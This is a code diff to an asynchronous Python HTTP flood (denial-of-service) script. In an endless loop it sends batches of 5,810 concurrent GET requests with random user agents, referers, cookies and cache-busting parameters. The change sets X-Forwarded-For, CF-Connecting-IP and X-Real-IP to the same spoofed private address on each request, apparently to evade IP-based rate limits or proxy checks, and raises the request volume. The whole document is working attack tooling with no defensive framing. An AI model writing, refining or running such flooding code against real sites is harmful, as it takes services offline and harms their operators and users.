@@ -1,6 +1,7 @@
 import asyncio
 import httpx
 import random
+import re
 import ipaddress
 from datetime import datetime, timedelta
 import sys
@@ -13,7 +14,6 @@ request_counter = 0
 flag = False
 
 isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
-real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
 
 def load_useragents():
     with open('useragents.txt', 'r') as f:
@@ -26,10 +26,11 @@ def load_referers():
 headers_useragents = load_useragents()
 headers_referers = load_referers()
 
-def generate_spoofed_ip():
-    isp_block = random.choice(isp_blocks)
-    network = ipaddress.ip_network(isp_block, strict=False)
-    return str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))
+def generate_ip():
+    block = random.choice(isp_blocks)
+    network = ipaddress.ip_network(block, strict=False)
+    ip = ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1))
+    return str(ip)
 
 def generate_cookie():
     expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
@@ -40,6 +41,7 @@ def buildblock(size):
 
 async def httpcall(client):
     global request_counter
+    spoofed_ip = generate_ip()
     if url.count("?") > 0:
         param_joiner = "&"
     else:
@@ -48,10 +50,10 @@ async def httpcall(client):
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
-        'X-Forwarded-For': generate_spoofed_ip(),
+        'X-Forwarded-For': spoofed_ip,
         'Cookie': generate_cookie(),
-        'CF-Connecting-IP': random.choice(real_ips),
-        'X-Real-IP': random.choice(real_ips)
+        'CF-Connecting-IP': spoofed_ip,
+        'X-Real-IP': spoofed_ip
     }
     try:
         await client.get(request_url, headers=headers)
@@ -63,7 +65,7 @@ async def run_attack():
     global flag
     async with httpx.AsyncClient() as client:
         while not flag:
-            tasks = [httpcall(client) for _ in range(5000)]
+            tasks = [httpcall(client) for _ in range(5810)]
             await asyncio.gather(*tasks)
             await asyncio.sleep(random.uniform(0.1, 0.5))
 
